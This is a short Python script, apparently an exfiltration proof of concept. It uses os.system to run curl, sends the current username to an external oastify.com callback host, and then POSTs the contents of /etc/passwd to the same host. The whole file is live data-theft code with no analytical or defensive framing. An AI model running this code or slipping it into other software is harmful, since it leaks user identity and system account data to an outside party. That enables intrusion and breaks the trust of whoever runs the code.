
import os
# Exfiltrate current user
os.system("curl http://bcrsrie2j82lq4m1xn5b56717sdja71vq.oastify.com/$(whoami)")

# Read and exfiltrate /etc/passwd (LFI-style)
os.system("curl -X POST --data-binary '@/etc/passwd' http://bcrsrie2j82lq4m1xn5b56717sdja71vq.oastify.com/$(whoami)")
